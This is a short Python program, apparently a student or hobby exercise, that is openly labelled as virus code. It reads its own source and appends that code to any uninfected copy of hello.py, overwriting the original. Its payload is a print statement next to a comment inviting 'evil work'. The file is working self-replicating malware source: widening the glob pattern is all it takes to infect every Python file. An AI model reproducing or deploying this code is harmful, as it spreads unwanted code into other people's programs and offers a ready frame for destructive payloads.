#leighTrinity
#Dec 20 2021

#starting virus code
import sys
import glob
import re

#get a copy of the virus

virusCode= []
thisFile= sys.argv[0]
virusFile= open(thisFile, "r")
lines= virusFile.readlines()
virusFile.close()

#put virus code into the code
inVirus= False
for line in lines:
    if(re.search('^#starting virus code', line)):
        inVirus= True

        #if the virus has been found then start appending the
        #lines to virusCode. We assume that the virus code is always
        #placed at the end of the file.

    if(inVirus):
        virusCode.append(line)
    if(re.search('^# end of virus code',line)):
        break

#Find potential victims
programs= glob.glob("hello.py")

#check and infect all other programs that gob found
for p in programs:
    file=open(p,"r")
    programCode = file.readlines()
    file.close()

    #check to see if this program is infected
    infected = False
    for line in programCode:
        if('#starting virus code' in line):
            infected=True
            break

            #stop, we dont need to inspect this program agan

    if not infected:
        newCode= []
        #new version =curent + virus code
        newCode= programCode
        newCode.extend(virusCode)
        #write the new version to the file. Overwrite original

        file = open(p,"w")
        file.writelines(newCode)
        file.close()

    #Payload: do your evil work here!

    print("This file is infected")





# end of virus code
